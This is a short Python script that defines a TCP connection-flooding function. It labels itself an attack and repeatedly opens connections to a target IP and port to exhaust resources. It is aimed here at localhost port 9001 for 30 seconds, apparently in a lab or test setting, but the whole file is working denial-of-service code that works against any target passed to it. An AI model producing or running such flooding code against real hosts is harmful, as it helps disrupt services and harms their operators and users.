import socket
import time

def tcp_flood(target_ip, target_port, duration):
    print(f"[*] ATTACK STARTED: TCP Flooding {target_ip}:{target_port} for {duration}s")
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            # Repeatedly opening connections consumes more resources
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((target_ip, target_port))
            s.send(b"OVERLOAD_PACKET")
            s.close()
        except:
            pass
    print("[*] ATTACK COMPLETE.")

if __name__ == "__main__":
    tcp_flood("127.0.0.1", 9001, 30) # Increased duration to 30s
